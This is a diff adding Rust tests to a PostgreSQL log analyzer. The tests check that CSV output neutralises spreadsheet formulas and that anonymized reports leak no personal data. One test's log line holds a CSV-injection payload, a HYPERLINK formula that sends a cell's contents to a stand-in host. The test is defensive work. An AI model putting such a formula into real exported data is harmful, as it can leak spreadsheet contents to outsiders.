@@ -391,3 +391,108 @@ fn anonymized_reports_leak_no_name_in_any_format_and_keep_the_numbers() -> io::R
     );
     Ok(())
 }
+
+#[test]
+fn csv_text_that_looks_like_a_formula_is_neutralised() -> io::Result<()> {
+    let d = dir("csvinj")?;
+    let log = d.join("evil.log");
+    fs::write(
+        &log,
+        "2026-10-14 10:00:00.000 UTC [1] u@db/app LOG:  duration: 5.000 ms  statement: =HYPERLINK(\"http://x/\"&A1)\n",
+    )?;
+    let out = pgloupe(&[
+        "report",
+        s(&log),
+        "--prefix",
+        "%m [%p] %q%u@%d/%a ",
+        "--output",
+        "csv",
+    ])?;
+    assert!(out.status.success(), "{}", stderr(&out));
+    let text = stdout(&out);
+    assert!(
+        text.contains(",'=HYPERLINK") || text.contains(",\"'=HYPERLINK"),
+        "{text}"
+    );
+    assert!(
+        !text.contains(",=HYPERLINK") && !text.contains(",\"=HYPERLINK"),
+        "{text}"
+    );
+    Ok(())
+}
+
+#[test]
+fn anonymize_covers_messages_details_comments_and_the_key_may_come_from_the_environment()
+-> io::Result<()> {
+    let d = dir("anonleaks")?;
+    let log = d.join("leaky.log");
+    fs::write(
+        &log,
+        "2026-10-14 10:00:00.000 UTC [1] alice@acme_prod/Acme Billing Worker LOG:  connection authorized: user=alice database=acme_prod application_name=Acme Billing Worker\n\
+         2026-10-14 10:00:01.000 UTC [1] alice@acme_prod/Acme Billing Worker LOG:  duration: 5.000 ms  statement: SELECT * FROM t -- don't tell\n\
+         \x20\x20\x20\x20WHERE ssn = 123456789 AND note = 'top secret'\n\
+         2026-10-14 10:00:02.000 UTC [1] alice@acme_prod/Acme Billing Worker FATAL:  password authentication failed for user \"mallory\"\n\
+         2026-10-14 10:00:03.000 UTC [1] alice@acme_prod/Acme Billing Worker ERROR:  null value violates not-null constraint\n\
+         2026-10-14 10:00:03.000 UTC [1] alice@acme_prod/Acme Billing Worker DETAIL:  Failing row contains (17, Jane Doe, null, 555-0100).\n\
+         2026-10-14 10:00:04.000 UTC [1] alice@acme_prod/Acme Billing Worker LOG:  unexpected shape with secret_customer_name\n",
+    )?;
+    let secrets = [
+        "alice",
+        "acme_prod",
+        "Acme",
+        "mallory",
+        "Jane Doe",
+        "555-0100",
+        "top secret",
+        "123456789",
+        "secret_customer_name",
+        "don't tell",
+    ];
+    for format in ["json", "text", "html", "csv"] {
+        let out = Command::new(env!("CARGO_BIN_EXE_pgloupe"))
+            .args([
+                "report",
+                "--prefix",
+                "%m [%p] %q%u@%d/%a ",
+                "--anonymize",
+                "--output",
+                format,
+            ])
+            .arg(&log)
+            // The key comes from the environment, and is ignored by commands without --anonymize.
+            .env("PGLOUPE_ANONYMIZE_KEY", "from-env")
+            .output()?;
+        assert!(out.status.success(), "{format}: {}", stderr(&out));
+        let text = stdout(&out);
+        for secret in secrets {
+            assert!(!text.contains(secret), "{format} leaks {secret:?}");
+        }
+    }
+    let plain = Command::new(env!("CARGO_BIN_EXE_pgloupe"))
+        .args(["logs", "analyze", "--prefix", "%m [%p] %q%u@%d/%a "])
+        .arg(&log)
+        .env("PGLOUPE_ANONYMIZE_KEY", "from-env")
+        .output()?;
+    assert!(plain.status.success(), "{}", stderr(&plain));
+    // Stores: a different key is a different store, not a second set of pseudonyms.
+    let store = d.join("s.db");
+    let ingest = |key: &str| -> io::Result<Output> {
+        pgloupe(&[
+            "logs",
+            "ingest",
+            "--store",
+            s(&store),
+            "--prefix",
+            "%m [%p] %q%u@%d/%a ",
+            "--anonymize",
+            "--anonymize-key",
+            key,
+            s(&log),
+        ])
+    };
+    assert!(ingest("one")?.status.success());
+    let other = ingest("two")?;
+    assert!(!other.status.success());
+    assert!(stderr(&other).contains("filter"), "{}", stderr(&other));
+    Ok(())
+}
